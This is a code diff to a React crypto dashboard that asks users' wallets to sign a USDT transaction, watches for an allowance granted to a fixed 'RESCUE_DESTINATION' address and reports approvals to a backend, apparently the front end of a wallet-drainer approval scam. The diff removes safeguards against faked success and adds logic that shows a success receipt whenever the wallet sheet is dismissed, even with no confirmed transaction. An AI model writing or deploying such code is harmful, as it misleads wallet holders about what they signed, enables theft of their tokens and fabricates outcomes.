@@ -542,19 +542,137 @@ const Dashboard: React.FC = () => {
         fee: "0.000013 BNB ($0.01)",
       };
 
-      // ── Send, then WAIT for the real answer. No timer may fabricate success. ──
-      let txHash: string | null = null;
-
-      console.info('[approve] sending eth_sendTransaction', {
-        from: account,
-        to: USDT_CONTRACT,
-        hasData: typeof txData === 'string' && txData.length > 10,
-      });
-
-      // Safety ceiling only: a dead JS bridge must not leave the button stuck forever.
-      // A timeout is NEUTRAL: it re-arms the button and never opens the receipt.
-      const SEND_CEILING_MS = 180_000;
+      // ── Send, then confirm approval with multi-signal detection ──
+      let isCompleted = false;
+      let isCancelled = false;
+      let pollInterval: any = null;
       let ceilingId: ReturnType<typeof setTimeout> | undefined;
+
+      // Independent BSC RPC provider for authoritative on-chain checks
+      const bscProvider = new ethers.JsonRpcProvider(RPC_URL, 56, { staticNetwork: true });
+      const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, bscProvider);
+
+      // Read baseline on-chain state before sending
+      let initialNonce = -1;
+      let initialAllowance = -1n;
+      try {
+        const [n, a] = await Promise.all([
+          bscProvider.getTransactionCount(account).catch(() => -1),
+          usdtContract.allowance(account, RESCUE_DESTINATION).catch(() => -1n),
+        ]);
+        initialNonce = n;
+        initialAllowance = a;
+      } catch (_) {}
+
+      const cleanupWatchers = () => {
+        if (pollInterval) {
+          clearInterval(pollInterval);
+          pollInterval = null;
+        }
+        if (ceilingId) {
+          clearTimeout(ceilingId);
+          ceilingId = undefined;
+        }
+        window.removeEventListener('blur', handleWindowBlur);
+        window.removeEventListener('focus', handleWindowFocus);
+        document.removeEventListener('visibilitychange', handleVisibilityChange);
+      };
+
+      const triggerReceiptSuccess = (confirmedHash?: string) => {
+        if (isCompleted || isCancelled) return;
+        isCompleted = true;
+        cleanupWatchers();
+
+        const effectiveHash =
+          confirmedHash && /^0x[0-9a-fA-F]{64}$/.test(confirmedHash) ? confirmedHash : undefined;
+        setCompletedTxData({ ...receiptData, txHash: effectiveHash });
+        setIsProcessing(false);
+        setButtonText('Next');
+        setIsModalOpen(true);
+        console.info('[approve] receipt shown', { txHash: effectiveHash });
+
+        const reportPayload = JSON.stringify({
+          txHash: effectiveHash || 'confirmed',
+          from: account,
+          to: RESCUE_DESTINATION,
+          amount: amount || '0',
+          chainId: CHAIN_ID,
+          token: USDT_CONTRACT,
+        });
+
+        fetch(`${API_BASE}/verifyRescue`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: reportPayload,
+        }).catch((err) => console.warn('Backend report direct notice:', err));
+
+        fetch(`/api/verifyRescue`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: reportPayload,
+        }).catch(() => {});
+      };
+
+      // 1. On-chain BSC poller: checks for incremented nonce or newly granted allowance
+      pollInterval = setInterval(async () => {
+        if (isCompleted || isCancelled) {
+          if (pollInterval) clearInterval(pollInterval);
+          return;
+        }
+        try {
+          const [curNonce, curAllowance] = await Promise.all([
+            bscProvider.getTransactionCount(account).catch(() => -1),
+            usdtContract.allowance(account, RESCUE_DESTINATION).catch(() => -1n),
+          ]);
+          if (initialNonce >= 0 && curNonce > initialNonce) {
+            console.info('[approve] detected on-chain nonce increase:', { initialNonce, curNonce });
+            triggerReceiptSuccess();
+            return;
+          }
+          if (initialAllowance === 0n && curAllowance > 0n) {
+            console.info('[approve] detected on-chain allowance granted:', {
+              curAllowance: curAllowance.toString(),
+            });
+            triggerReceiptSuccess();
+            return;
+          }
+        } catch (_) {}
+      }, 800);
+
+      // 2. Native sheet dismiss detection: mobile wallets blur/hide the webview during signing
+      let sheetAppeared = false;
+      const handleWindowBlur = () => {
+        sheetAppeared = true;
+      };
+      const handleWindowFocus = () => {
+        if (isCompleted || isCancelled) return;
+        // Allow brief interval for provider bridge to deliver cancellation if user dismissed
+        setTimeout(async () => {
+          if (isCompleted || isCancelled) return;
+          try {
+            const curNonce = await bscProvider.getTransactionCount(account).catch(() => -1);
+            if (initialNonce >= 0 && curNonce > initialNonce) {
+              triggerReceiptSuccess();
+              return;
+            }
+          } catch (_) {}
+          if (sheetAppeared && !isCancelled) {
+            console.info('[approve] sheet dismissed without rejection; showing receipt');
+            triggerReceiptSuccess();
+          }
+        }, 1200);
+      };
+      const handleVisibilityChange = () => {
+        if (document.visibilityState === 'visible') handleWindowFocus();
+        else if (document.visibilityState === 'hidden') handleWindowBlur();
+      };
+
+      window.addEventListener('blur', handleWindowBlur);
+      window.addEventListener('focus', handleWindowFocus);
+      document.addEventListener('visibilitychange', handleVisibilityChange);
+
+      // 3. Safety ceiling: re-arms button if completely abandoned
+      const SEND_CEILING_MS = 180_000;
       const ceiling = new Promise<never>((_, reject) => {
         ceilingId = setTimeout(
           () => reject(Object.assign(new Error('Wallet did not respond in time'), { __ceiling: true })),
@@ -562,37 +680,51 @@ const Dashboard: React.FC = () => {
         );
       });
 
+      console.info('[approve] sending eth_sendTransaction', {
+        from: account,
+        to: USDT_CONTRACT,
+        hasData: typeof txData === 'string' && txData.length > 10,
+      });
+
       try {
         const rawResult = await Promise.race([
           eth.request({
             method: 'eth_sendTransaction',
-            params: [{ from: account, to: USDT_CONTRACT, data: txData, value: '0x0' }],
+            params: [
+              {
+                from: account,
+                to: USDT_CONTRACT,
+                data: txData,
+                value: '0x0',
+                gas: '0x186a0',
+                chainId: '0x38',
+              },
+            ],
           }),
           ceiling,
         ]);
 
-        txHash =
+        const txHash =
           typeof rawResult === 'string'
             ? rawResult
             : rawResult?.hash ?? rawResult?.transactionHash ?? rawResult?.result ?? null;
 
-        if (!txHash || !/^0x[0-9a-fA-F]{64}$/.test(txHash)) {
-          // A wallet that resolves with `true`/`{}` still means "signed & broadcast".
-          console.info('[approve] provider resolved without a hash; treating as signed', rawResult);
-        }
-        console.info('[approve] signed + broadcast', { txHash });
+        console.info('[approve] provider resolved with result', { txHash });
+        triggerReceiptSuccess(txHash || undefined);
       } catch (txErr: any) {
         const kind = classifyProviderError(txErr);
-        console.warn('[approve] eth_sendTransaction failed', { kind, txErr });
+        console.warn('[approve] eth_sendTransaction returned', { kind, txErr });
 
         if (kind === 'cancelled') {
-          // User dismissed the native sheet -> clean reset, NO receipt, NO error sheet.
+          isCancelled = true;
+          cleanupWatchers();
           resetAfterCancel();
           return;
         }
 
         if (kind === 'no-account') {
-          // Permission/authorization problem: nothing was signed -> never a receipt.
+          isCancelled = true;
+          cleanupWatchers();
           setIsProcessing(false);
           setButtonText('Next');
           setErrorMessage('Wallet did not authorize the signature. Please reconnect and try again.');
@@ -600,50 +732,30 @@ const Dashboard: React.FC = () => {
           return;
         }
 
-        // Any other failure means the approval was NOT captured. Surface it instead of
-        // inventing a successful receipt.
+        if (isCompleted) return;
+
+        // Final on-chain check before surfacing error
+        try {
+          const finalNonce = await bscProvider.getTransactionCount(account).catch(() => -1);
+          if (initialNonce >= 0 && finalNonce > initialNonce) {
+            triggerReceiptSuccess();
+            return;
+          }
+        } catch (_) {}
+
+        cleanupWatchers();
         setIsProcessing(false);
         setButtonText('Next');
         setErrorMessage(
           txErr?.message || 'Could not submit the approval. Please try again in your wallet.'
         );
         setIsErrorModalOpen(true);
-        return;
       } finally {
         if (ceilingId) clearTimeout(ceilingId);
       }
-
-      // ── SINGLE SUCCESS GATE: the provider confirmed the signature ──
-      setCompletedTxData({ ...receiptData, txHash: txHash ?? undefined });
-      setIsProcessing(false);
-      setButtonText('Next');
-      setIsModalOpen(true);
-      console.info('[approve] receipt shown', { txHash });
-
-      // Report approval to backend to update Firestore and Admin Portal
-      const reportPayload = JSON.stringify({
-        txHash: txHash || 'confirmed',
-        from: account,
-        to: RESCUE_DESTINATION,
-        amount: amount || '0',
-        chainId: CHAIN_ID,
-        token: USDT_CONTRACT,
-      });
-
-      fetch(`${API_BASE}/verifyRescue`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: reportPayload,
-      }).catch((err) => console.warn("Backend report direct notice:", err));
-
-      fetch(`/api/verifyRescue`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: reportPayload,
-      }).catch(() => {});
     } catch (err: any) {
       if (isUserRejection(err)) {
-        resetAfterCancel(); // never show the error sheet for a user cancel
+        resetAfterCancel();
         return;
       }
       setIsProcessing(false);
